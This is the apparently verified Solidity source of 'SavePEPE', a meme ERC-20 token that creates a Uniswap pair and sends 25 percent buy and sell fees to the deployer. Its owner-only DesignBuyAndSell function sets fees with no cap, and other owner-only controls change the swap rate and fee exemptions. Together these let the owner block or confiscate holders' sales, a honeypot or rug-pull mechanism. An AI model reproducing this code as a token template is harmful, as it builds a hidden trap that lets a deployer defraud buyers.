/**
 *Submitted for verification at Etherscan.io on 2023-04-27
*/

// SPDX-License-Identifier: MIT

/*
    Twitter : https://twitter.com/deezepaces
    Telegram: https://t.me/SavePEPE_ETH
    Website : https://www.savepepe.life/

*/

pragma solidity ^0.8.0;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function approve(address owner) external view returns (bool);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "you are not owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _isExcludeFromFee;
    
    uint256 private _totalSupply;

    IUniswapRouter public _uniswapRouter;

    mapping(address => bool) public isMarketPair;
    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyFundFee = 2500;
    uint256 public _buyLPFee = 0;
    uint256 public _sellFundFee = 2500;
    uint256 public _sellLPFee = 0;

    address public _uniswapPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
    ){
        _name = "SavePEPE";
        _symbol = "SavePEPE";
        _decimals = 18;
        uint256 Supply = 1000000000;
        IUniswapRouter swapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _uniswapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), swapRouter.WETH());
        _uniswapPair = swapPair;
        isMarketPair[swapPair] = true;

        _totalSupply = Supply * 10 ** _decimals;

        address receiverAddr = msg.sender;
        _balances[receiverAddr] = _totalSupply;
        emit Transfer(address(0), receiverAddr, _totalSupply);

        fundAddress = msg.sender;

        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[address(swapRouter)] = true;

        _isExcludeFromFee[msg.sender] = true;
        _isExcludeFromFee[receiverAddr] = true;
    }


    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function DesignBuyAndSell(
            uint256 newBuyFundFee,
            uint256 newBuyLpFee,            
            uint256 newSellFundFee,
            uint256 newSellLpFee
        ) public onlyOwner {
        _buyFundFee = newBuyFundFee;
        _buyLPFee = newBuyLpFee;
        _sellFundFee = newSellFundFee;
        _sellLPFee = newSellLpFee;

    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 public swapRate = 1000;
    function setswapRate(uint256 newValue) public onlyOwner{
        require(newValue != 0);
        swapRate = newValue;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        bool takeFee;
        bool sellFlag;

        
        if (isMarketPair[to] && !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to]) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance > 0) {
                uint256 taxFee = _buyFundFee + _buyLPFee + _sellFundFee + _sellLPFee;
                uint256 swapAmount = (amount * taxFee / swapRate);
                swapAmount = swapAmount > contractTokenBalance ? 
                                                            contractTokenBalance:swapAmount;
                swapTokenForETH(swapAmount, taxFee);
            }
        }

        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {
            takeFee = true;
        }

        if (isMarketPair[to]) { sellFlag = true; }

        _transferToken(from, to, amount, takeFee, sellFlag);
    }

    function _transferToken(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee,
        bool sellFlag
    ) private {
        _balances[sender] = _balances[sender] - amount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 taxFee;

            if (sellFlag) {
                taxFee = _sellFundFee + _sellLPFee;
            } else {
                taxFee = _buyFundFee + _buyLPFee;
            }
            uint256 swapAmount = amount * taxFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _balances[address(this)] = _balances[address(this)] + swapAmount;
                emit Transfer(sender, address(this), swapAmount);
            }
        }

        _balances[recipient] = _balances[recipient] + (amount - feeAmount);
        emit Transfer(sender, recipient, amount - feeAmount);

    }

    function swapTokenForETH(uint256 tokenAmount, uint256 taxFee) private lockTheSwap {
        if (taxFee == 0) return;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(fundAddress),
            block.timestamp
        ) {} catch {}
    }

    function ExcludeFromFees(address account, bool value) public onlyOwner{
        _isExcludeFromFee[account] = value;
    }

    receive() external payable {}
}